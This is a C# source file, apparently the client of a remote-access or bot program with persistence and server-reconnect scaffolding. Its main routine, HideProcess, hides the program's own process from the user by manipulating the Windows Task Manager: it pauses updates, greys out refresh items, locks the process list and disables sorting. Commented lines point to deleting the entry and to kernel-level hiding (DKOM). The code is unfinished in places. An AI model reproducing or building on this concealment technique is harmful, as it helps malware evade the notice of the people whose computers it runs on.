using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Client.API;

namespace Client
{
    class Program
    {
        private static  Persistence  _Persistence = new Persistence();
        private static  LocalMachine _ThisPC = new LocalMachine();
        private static  Server       _Server = new Server();

        static void Main(string[] args)
        {
            Init();
            CheckMachineStates();

            HideProcess();

            //DKOM.ProcessChain = System.Diagnostics.Process.GetProcesses().ToList();
            //var result = DKOM.FindWindow(null, "Untitled - Notepad");


            Console.WriteLine("--");

           /* do
            {
                // If we are offline.
                while (_ThisPC.Status == LocalMachine.State.OFFLINE)
                {
                    _ThisPC.Reconnect();
                }

                // If we are online, but the server is unreachable.
                while (_Server.Status == Server.State.OFFLINE && _ThisPC.Status == LocalMachine.State.ONLINE)
                {
                    _Server.Probe();
                }

                while (_ThisPC.Status == LocalMachine.State.ONLINE && _Server.Status == Server.State.ONLINE)
                {
                    CheckMachineStates();
                    Start();
                }

                Thread.Sleep(1000);
            } while (true);
        */}

        private static void Init()
        {
            // Set predefined config here.
            Logger.IsEnabled = true;

            string logging = Logger.IsEnabled ? "ON" : "OFF";
            Console.WriteLine("[{0}] Logging\n", logging);
 
        }

        private static void Start()
        {
        }

        private static void CheckMachineStates()
        {
            _ThisPC.Reconnect();
            _Server.Probe();
        }

        // Hacky as fuck but it seems to be working so far
        // Needs removal of hardcoded application name and some other general improvements.
        private static void HideProcess()
        {
            IntPtr lhWndParent = User32.FindWindow(null, "Task Manager");
            Console.WriteLine("Handle:\t" + lhWndParent + " - 0x" + lhWndParent.ToString("X"));

            IntPtr lhTaskManagerMain = new IntPtr(),
                   lhDirectUIHWND = new IntPtr(),
                   lhSysListView32 = new IntPtr(),
                   lhSysHeader32 = new IntPtr();

            // Get Task manager menus
            IntPtr hMenu = User32.GetMenu(lhWndParent);
            IntPtr hSubMenu = User32.GetSubMenu(hMenu, 2);
            IntPtr hSubSubMenu = User32.GetSubMenu(hSubMenu, 1);
            
            // Refresh now button
            Int32 refreshNowButton = User32.GetMenuItemID(hSubMenu, 0);

            // Menu items
            List<Int32> updateNowList = new List<int>()
            {
                User32.GetMenuItemID(hSubSubMenu, 0),
                User32.GetMenuItemID(hSubSubMenu, 1),
                User32.GetMenuItemID(hSubSubMenu, 2),
                User32.GetMenuItemID(hSubSubMenu, 3)
            };

            
            //Force clicking of the pause
            User32.PostMessage(lhWndParent, User32.WM_COMMAND, updateNowList[3] , 0);

            foreach (Int32 button in updateNowList)
            {
                User32.EnableMenuItem(hMenu, (uint)button, User32.MF_GRAYED);
            }
            User32.EnableMenuItem(hMenu, (uint)refreshNowButton, User32.MF_ENABLED);

            // Start working our way down the UI classes to the listview
            lhTaskManagerMain = User32.FindWindowEx(lhWndParent, lhTaskManagerMain, null, null);
            lhDirectUIHWND = User32.FindWindowEx(lhTaskManagerMain, lhDirectUIHWND, null, null);

            // Step through the task manager inner windows looking for the process lists
            for (int i = 0; i < 7; i++)
            {
                lhSysListView32 = User32.FindWindowEx(lhDirectUIHWND, lhSysListView32, null , null);
                
                if (User32.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
                {
                    Console.WriteLine(" Found tasklist window at 0x" + lhSysListView32.ToString("X"));
                    lhSysListView32 = User32.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null);
                    lhSysHeader32 = User32.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysHeader32", null);
                    break;
                }
            }

            User32.LockWindowUpdate(lhSysListView32);

            List<Process> proclist = Process.GetProcesses().ToList();
            proclist = proclist.OrderBy(x => x.ProcessName).ToList();

            int index = 0;

            foreach (Process p in proclist)
            {
                if (p.ProcessName.ToLower() == "client.vshost")
                    index = proclist.IndexOf(p);
            }



            User32.PostMessage(lhWndParent, User32.WM_COMMAND, refreshNowButton, 0); //Refresh
            User32.EnableWindow(lhSysHeader32, false);                               // Disable sorting
            User32.PostMessage(lhSysListView32, User32.LVM_SORTITEMS, 0, 0);         //Sort
            //DKOM.PostMessage(lhSysListView32, DKOM.LVM_DELETEITEM, index, 0);      //Delete
            //DKOM.LockWindowUpdate(IntPtr.Zero);

          
            

       }

    }
}
